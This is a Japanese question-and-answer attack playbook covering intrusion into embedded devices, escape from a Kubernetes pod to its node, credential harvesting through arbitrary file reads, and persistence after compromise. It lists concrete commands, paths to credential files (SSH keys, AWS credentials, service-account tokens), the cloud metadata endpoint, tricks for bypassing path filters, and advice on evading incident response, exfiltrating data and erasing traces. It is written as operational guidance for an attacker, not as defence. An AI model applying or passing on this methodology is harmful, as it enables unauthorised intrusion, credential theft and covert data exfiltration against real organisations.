**Q3**: ファイルシステムが読み取り専用(squashfs)で、ツールを置けない場合はどうするか?
**A3**: 「メモリ内実行」のディメンションに方向転換する:wget/tftp で静的コンパイルの arm/mips バイナリを `/tmp`(通常 tmpfs で書き込み・実行可能)に引くか、/dev/shm に置く。機器の tmpfs が最後の書き込み可能点である。
**Q4**: /tmp も noexec、またはアーキテクチャに対応する binary がない場合、遮断されたらどこへ方向転換するか?
**A4**: 「機器自体の能力」のディメンションに直交転換する:ルーターには iptables があり、ルート変更/ポートフォワーディングを開ける。カメラにはネットワークストリームがある。産業制御には制御可能な PLC 命令がある。shell を追わず、機器の本務能力で偵察/横展開する。
**Q5**: 完全に無路で、一度だけ短いコマンドをトリガーできる場合はどうするか?
**A5**: この一度のトリガーで最も価値のあることをする:設定ファイル(パスワード/ネットワークトポロジ/認証情報を含む)を読める場所に dump し、一気に読む。組み込み機器の config は最も価値のある目標であることが多く、shell より実用的である。

### Kubernetes Pod 内で shell を得て node を取りたい
**Q1**: pod に侵入して shell を得た(web アプリの pod かもしれない)。ホスト node に跳びたい。先に何を判断するか?
**A1**: 先に pod の権限マトリクスを見る:`cat /var/run/secrets/kubernetes.io/serviceaccount/token`(SA token がマウントされているか)、`ls /var/run/docker.sock`(docker sock がマウントされているか)、`mount | grep host`(ホストディレクトリがマウントされているか)、`capsh --print`(capabilities)。どれか 1 項目でも異常なら 1 つの経路になる。
**Q2**: SA token がマウントされている場合、権限マトリクスをどう見るか?
**A2**: token で API を呼ぶ:`kubectl auth can-i --list --token=$TOKEN`。Pod/DaemonSet/Job を作成できる権限を探す。作れるなら、特権 Pod(hostPID、privileged、host `/` マウント)を起動して node に跳ぶ。SA 権限がこの経路の実現可能性を決める。
**Q3**: SA 権限が極小で、マウント異常もないが、metadata サービスにアクセスできる場合はどうするか?
**A3**: metadata のディメンションに方向転換する:クラウド環境の metadata endpoint(169.254.169.254)は IAM/instance credential を漏らすことが多く、node やクラスタ全体の認証情報を得られる。判定基準はそのアドレスにアクセスできるか、IMDSv2 の強制 hop-limit があるかである。
**Q4**: metadata も隔離されている場合、遮断されたらどこへ方向転換するか?
**A4**: 「別の pod への横展開」のディメンションに直交転換する:pod 間のネットワークはフラットなことが多く、内部ネットワークをスキャンして脆いサービス(Redis 未認可、Consul 未認可、古い web アプリ、開発環境の debug ポート)を探す。クラスタで最も脆いのは現在の pod でないことが多い。
**Q5**: クラスタネットワークが厳格に隔離されている(NetworkPolicy)場合、横展開も通らないか?
**A5**: 「この pod 内のデータ/サービス」に格下げする:マウントされた configmap/secret を読む、接続するデータベースを読む、環境変数の認証情報を読む。外へ出られないと認め、pod を純粋な情報ノードとして使い切って去る。

### 任意ファイル読み取りという 1 つの原語しかない場合、どう最大価値を絞り出すか
**Q1**: 「任意ファイル読み取り」(LFI/XXE/パス遷移)だけを得て、書き込みも実行もない。この原語でどれだけ絞り出せるか?
**A1**: 「対象プロセスの身元で任意パスを読む」と捉え、価値が非常に高い。先に 3 層のリストを作る:1 つは「直接の認証情報」(権限があれば `/etc/shadow`、`~/.ssh/id_*`、`~/.aws/credentials`、`~/.docker/config.json`、`~/.git-credentials`)。2 つ目は「アプリケーション設定」(web アプリの config、DB 接続文字列、鍵ファイル)。3 つ目は「コンテキスト/メモリ系」( `/proc/self/environ`、`/proc/*/cmdline`、`/proc/*/maps`)。値の降順で読む。
**Q2**: shadow が読めない(プロセスが非 root)場合、どう認証情報を探すか?
**A2**: 「アプリケーション層の認証情報」に方向転換する:web アプリの設定ファイルには DB/キャッシュ/メール/API のパスワードが平文で書かれている可能性が高い。`.git/config` の remote URL に token が含まれることがある。フレームワークの session 鍵があればオフラインで session を偽造できる。アプリ認証情報はシステム認証情報より面がはるかに広い。
**Q3**: アプリのパスが分からない場合はどうするか?
**A3**: 「既知から未知を読む」:先に `/proc/self/cmdline` を読んで現在のプロセスの起動引数を得て app パスを見つける。`/proc/self/maps` を読んでロード済みライブラリリストを得る。nginx/apache のメイン設定を読んで全ての vhost と webroot を特定する。ファイル読み取りを偵察に使い、未知のパスを既知に変える。
**Q4**: RCE に変えたい場合、ファイル読み取りから昇格できるか?
**A4**: 定番の経路がいくつかある:SSH 秘密鍵を読んで直接ログイン(RCE と等価)、session 鍵を読んで管理者 session を偽造してバックエンドからアップロード、DB 認証情報を読んでデータベースに直結して DB 層の RCE、フレームワークの debug 鍵(Werkzeug PIN 系)を読んでコンソールを取る。ファイル読み取り昇格の鍵は「新たな入口を開く鍵を読む」ことである。
**Q5**: 対象ファイルが全く読めない(パスフィルタが厳しく、特定の拡張子しか読めない)場合、遮断されたらどこへ方向転換するか?
**A5**: 「読み取り制限の迂回」のディメンションに直交転換する:URL エンコード/二重エンコード/ヌルバイト切り捨て(旧バージョン)/protocol wrapper(php://filter で base64 化して拡張子検査を迂回)/絶対パスから相対へ/シンボリックリンクで抜ける。または「読み取り原語の間接トリガー」に方向転換する。一部の XXE は SSRF をトリガーでき、一部の LFI は include をトリガーできる。「読む」から「実行」への拡張はプロトコル特性で完成する。
**Q6**: 読み取り原語が「固定のホワイトリスト数ファイルしか読めない」まで制限された場合はどうするか?
**A6**: これは最弱形態だと認め、それを「低頻度の情報チャネル」として使う:あるログ/状態ファイルを読めれば、ランタイム情報(ログインユーザー、エラースタック、ログ内の token)をまだ得られることがある。定期的にホワイトリストファイルの変化をポーリングし、その場でセンサーとして使う。

### 足場の固定化 - いつ手を止めて永続化するか
**Q1**: 使える shell/認証情報を 1 つ得たばかり。続けて深く入るか、先に永続化するか?
**A1**: 「現在の入口の安定性」と「深掘り動作の露出リスク」を判断する。入口が脆弱性利用で得たものなら(再起動/patch で消える)、先に永続化する。入口が安定した認証情報(AD アカウント、long-lived token)なら先に深く入れる。深掘り動作がノイズが大きい(カーネル exp を撃つ、mimikatz を走らせる)なら、その前に永続化すべきである。中断後に戻れなくなるのを防ぐためである。
**Q2**: 先に永続化すると決めた場合、どの形式を選ぶか?
**A2**: 「監査で見つかりやすさ」と「再起動後の生存」の 2 軸で選ぶ。webshell は簡単だがスキャンされやすい。SSH key は安定だが監査で見えやすい。システム級の永続化(cron/systemd/service)は再起動後も生きるが書き込み権限が必要。多様化する。2〜3 種類の直交する種別を同時に配置する方が単一よりはるかに強い。
**Q3**: 検知されるか不確かな場合(既にアラートがあるのではと心配)はどうするか?
**A3**: 「最小侵入の観察期間」のディメンションに方向転換する:先に重い永続化をせず、low-touch 手段(環境変数を変える、alias を足す、シンボリックリンクでこっそり替える)で後で戻れるが明らかな痕跡を残さないフックを 1 つ残し、しばらく対象の反応を見る。慌てて重い永続化を落とすと、一発で全アラートをトリガーしやすい。
**Q4**: 永続化したいが現在のユーザーがすぐ切替わり、プロセスも終了する場合、遮断されたらどこへ方向転換するか?
**A4**: 「永続化を別の実体に寄生させる」ディメンションに直交転換する:永続化は現在のユーザー/プロセスに掛ける必要はない。新規ユーザーを足す、他人の shell 設定を書き換える、システム級の unit を書く、などができる。永続化を現在の一時的な実行コンテキストから独立させる。
**Q5**: 環境が非常に機微で、どの永続化も IR に見つかり得る場合はどうするか?
**A5**: この種の対象は永続化に向かないと認め、「データを一度に持ち去る」モードに変える。素早く情報収集/認証情報取得/重要データの exfil を完了し、その後入口を放棄して痕跡を掃除する。永続化は必須ではなく、環境によっては「侵入-取得-撤退」の方が「侵入-駐留」よりプロフェッショナルである。
